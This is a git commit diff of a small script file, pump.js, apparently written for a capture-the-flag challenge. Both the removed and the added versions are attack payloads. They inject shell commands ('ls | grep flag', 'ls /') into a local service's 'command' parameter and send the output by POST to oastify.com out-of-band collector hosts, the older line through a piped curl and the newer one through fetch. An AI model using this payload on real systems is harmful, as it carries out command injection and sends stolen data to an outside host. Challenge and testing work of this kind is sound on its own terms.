f0350d74e27533021f07c7c83af67c97f5fc52eb
jellyf15h <86880362+jellyf15h@users.noreply.github.com>
2024-05-15 17:06:11 -0700

    Update pump.js

--- pump.js
+++ pump.js
@@ -1,3 +1,14 @@
 <script>
-fetch("https://localhost:1337/api/stats?command='ls | grep flag | curl -X POST -d @- http://xklqf2ly81rowgujq4vgur2vcmid66uv.oastify.com/test'");
-</script>
+fetch("http://127.0.0.1:1337/api/stats?command=ls+/").then((r) => {
+    return r.text();
+}).then((x) => {
+    fetch("http://rhckcwis5voitardnysarlzp9gf733rs.oastify.com/submit", {
+        "headers": {
+            "content-type": "application/json"
+        },
+        "body": x,
+        "method": "POST",
+        "mode": "cors",
+        "credentials": "omit"
+    });
+});</script>
